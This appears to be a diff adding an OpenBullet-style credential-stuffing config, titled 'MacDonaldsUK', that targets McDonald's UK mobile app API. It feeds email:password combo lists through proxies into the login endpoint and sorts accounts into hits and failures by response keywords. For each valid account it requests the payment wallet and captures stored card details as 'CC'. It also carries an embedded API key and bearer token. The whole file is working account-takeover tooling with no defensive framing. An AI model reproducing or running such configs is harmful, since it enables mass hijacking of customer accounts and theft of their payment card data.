@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "MacDonaldsUK",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-24T01:00:54.687703+03:00",
+  "AdditionalInfo": "",
+  "Author": "Serpent",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://europe.api.mcd.com/v2/customer/security/authentication?type=traditional" 
+  CONTENT "{\"password\":\"<PASS>\",\"type\":\"email\",\"loginUsername\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "mcd-marketid: UK" 
+  HEADER "mcd_apikey: UKDCUSANDPILOT9195414KIDLEU4480SD43T500UK" 
+  HEADER "MarketId: UK.PROD3" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-locale: en-GB" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Google Pixel XL Build/PD1A.180720.031)" 
+  HEADER "Host: europe.api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 95" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwECVlNSBQUE" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "This account doesn't exist" 
+    KEY "The account is currently inactive" 
+  KEYCHAIN Success OR 
+    KEY "lastLoggedInAt" 
+
+REQUEST GET "https://europe.api.mcd.com/v3/customer/payment/wallet" 
+  
+  HEADER "Authorization: Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIiwia2lkIjoiMjAxNy0wMi0wOCJ9.5TH4wSoZhMSoabMxlb2J_5oH556TYDoAJumbzLlkRVhY7pRC9BP1zQ.q36qv5RLHBF2LSrwznKqxg.OTi33MtQuyTzTCgwGY5ezk4LmabRLU5E4y0n_S_k-oRklsoRF36DStSn9srHKLIAk3sys59ppClJSHB5eyOTlCKHyunF97rHu-n-2KwvMON2AAfianM_wer9cE11eTRhIOwLMrt6I-PrbarBg2zUskp_-iuZmODJiDZZP_tOeOMZaDTRE4dkkGDX_9oPUpo4uJKF9VUdcRIYqNZnl0BgOCg0yDh3DMtZAgn6Q-wxL_dmPMtSh21JI2snMqnBatC4URuDMqpqBh-JCrLmn1GqSiyZP70ou2zUiBhbxgZi3pDGeal-SW1MH_7HyOMV3K1dM25vFpRzsZsD26LYHUe4vf1A9yOBkF3qV_yAD_zrdgdnuCVStDAztFRkNZveWL-2yViFmt0qR13OJnwrY-CyaWg_fdlD43tG0K619hZLtrVV90TtjQRD7MnbPIzPDXYf_yG7D-KUUzRITxuf0RR2yoLpfIyWfUZoh11o_YLcaZENA0Lrix4pmuj7QwA3K5NFyr7Bp6_faYNLzBneZfe7W1UMHxshVELsrNc10V1H1AO-mw4W46hm64cAIWuO0s6dIV9PrP45a5mziuOSZocRsN0i3BJJOSLq7SyfJdDN8OMUp8PP9UneFtigmUJORIAQK5r7IqINP-irxMk_krPHGKftmS6oetWcquw2gLOmhg8aHU8JlNgr9m-5XBWp1K1_LznoZG55Q3WHAwLzZaul5QoNkdHIwaLbORwf0Ggu6wRZtI-epcwUq3vsKgzf_DinBklUA1x0FuNSbZOK6wUhAJGoId4YxiA_wKutHw47Z1A.yNsGFLreSw2hnja9YRmkiQ" 
+  HEADER "mcd-marketid: UK" 
+  HEADER "mcd_apikey: UKDCUSANDPILOT9195414KIDLEU4480SD43T500UK" 
+  HEADER "MarketId: UK.PROD3" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-locale: en-GB" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Google Pixel XL Build/PD1A.180720.031)" 
+  HEADER "Host: europe.api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwECVlNSBQUE" 
+
+PARSE "<SOURCE>" LR "PaymentCard\":[" "],\"" -> CAP "CC" 
+
